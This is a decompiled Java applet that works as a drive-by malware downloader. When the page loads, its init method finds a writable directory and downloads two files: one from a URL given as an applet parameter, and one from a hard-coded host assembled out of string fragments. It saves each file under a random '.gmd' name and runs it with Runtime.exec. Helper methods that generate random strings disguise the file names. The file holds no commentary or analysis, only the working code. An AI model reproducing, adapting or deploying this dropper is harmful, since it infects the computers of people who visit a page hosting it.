import java.io.InputStream;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class afp extends Applet
{
    public static String getPassword4(final int n) {
        final char[] array = new char[n];
        int n2 = 65;
        for (int i = 0; i < n; ++i) {
            switch ((int)(Math.random() * 3.0)) {
                case 0: {
                    n2 = 48 + (int)(Math.random() * 10.0);
                    break;
                }
                case 1: {
                    n2 = 97 + (int)(Math.random() * 26.0);
                    break;
                }
                case 2: {
                    n2 = 65 + (int)(Math.random() * 26.0);
                    break;
                }
            }
            array[i] = (char)n2;
        }
        return new String(array);
    }
    
    public static String getPassword5(final int n) {
        final char[] array = new char[n];
        int n2 = 65;
        for (int i = 0; i < n; ++i) {
            switch ((int)(Math.random() * 3.0)) {
                case 0: {
                    n2 = 48 + (int)(Math.random() * 10.0);
                    break;
                }
                case 1: {
                    n2 = 97 + (int)(Math.random() * 26.0);
                    break;
                }
                case 2: {
                    n2 = 65 + (int)(Math.random() * 26.0);
                    break;
                }
            }
            array[i] = (char)n2;
        }
        return new String(array);
    }
    
    private boolean isWriteable(final String s, final String s2) {
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(s + File.pathSeparator + s2);
            fileOutputStream.write(1);
            fileOutputStream.close();
            new File(s + File.pathSeparator + s2).delete();
            return true;
        }
        catch (Exception ex) {
            return false;
        }
    }
    
    public static String getPassword3(final int n) {
        final char[] array = new char[n];
        int n2 = 65;
        for (int i = 0; i < n; ++i) {
            switch ((int)(Math.random() * 3.0)) {
                case 0: {
                    n2 = 48 + (int)(Math.random() * 10.0);
                    break;
                }
                case 1: {
                    n2 = 97 + (int)(Math.random() * 26.0);
                    break;
                }
                case 2: {
                    n2 = 65 + (int)(Math.random() * 26.0);
                    break;
                }
            }
            array[i] = (char)n2;
        }
        return new String(array);
    }
    
    private boolean DownloadFile(final String s, final String s2) {
        try {
            final URL url = new URL(s);
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(s2));
            final InputStream inputStream = url.openConnection().getInputStream();
            final byte[] array = new byte[1024];
            long n = 0L;
            int read;
            while ((read = inputStream.read(array)) != -1) {
                bufferedOutputStream.write(array, 0, read);
                n += read;
            }
            if (inputStream != null) {
                inputStream.close();
            }
            if (bufferedOutputStream != null) {
                bufferedOutputStream.close();
            }
            return true;
        }
        catch (Exception ex) {
            return false;
        }
    }
    
    public static String getPassword2(final int n) {
        final char[] array = new char[n];
        int n2 = 65;
        for (int i = 0; i < n; ++i) {
            switch ((int)(Math.random() * 3.0)) {
                case 0: {
                    n2 = 48 + (int)(Math.random() * 10.0);
                    break;
                }
                case 1: {
                    n2 = 97 + (int)(Math.random() * 26.0);
                    break;
                }
                case 2: {
                    n2 = 65 + (int)(Math.random() * 26.0);
                    break;
                }
                case 3: {
                    n2 = 48 + (int)(Math.random() * 10.0);
                    break;
                }
                case 4: {
                    n2 = 97 + (int)(Math.random() * 26.0);
                    break;
                }
                case 5: {
                    n2 = 65 + (int)(Math.random() * 26.0);
                    break;
                }
            }
            array[i] = (char)n2;
        }
        return new String(array);
    }
    
    public void CallJavaScript() {
    }
    
    public static String getPassword(final int n) {
        final char[] array = new char[n];
        int n2 = 65;
        for (int i = 0; i < n; ++i) {
            switch ((int)(Math.random() * 3.0)) {
                case 0: {
                    n2 = 48 + (int)(Math.random() * 10.0);
                    break;
                }
                case 1: {
                    n2 = 97 + (int)(Math.random() * 26.0);
                    break;
                }
                case 2: {
                    n2 = 65 + (int)(Math.random() * 26.0);
                    break;
                }
            }
            array[i] = (char)n2;
        }
        return new String(array);
    }
    
    @Override
    public void init() {
        new StringBuilder().append(getPassword(8)).append(".gmd").toString();
        new StringBuilder().append(getPassword(8)).append(".gmd").toString();
        final String s = "cristo";
        final String s2 = "21anos";
        final String s3 = "caju";
        final String string = "d" + getPassword(20) + "ir";
        final String s4 = "li";
        final String string2 = "http://www." + s + "te" + s3 + "spp" + s2 + ".com/web/ng.gif";
        final String string3 = getPassword3(8) + ".gmd";
        final String string4 = getPassword5(10) + ".gmd";
        final String string5 = s4 + "nk";
        try {
            final String[] split = System.getProperty("java.library.path").split(File.pathSeparator);
            String s5 = null;
            final String parameter = this.getParameter(string5);
            for (int i = 0; i < split.length; ++i) {
                final String s6 = split[i];
                if (this.isWriteable(s6, string)) {
                    s5 = s6;
                    break;
                }
            }
            if (s5 != null) {
                if (this.DownloadFile(parameter, s5 + "\\" + string3) && Runtime.getRuntime().exec(s5 + "\\" + string3) != null) {
                    this.CallJavaScript();
                }
                if (this.DownloadFile(string2, s5 + "\\" + string4) && Runtime.getRuntime().exec(s5 + "\\" + string4) != null) {
                    this.CallJavaScript();
                }
            }
        }
        catch (Exception ex) {}
    }
}
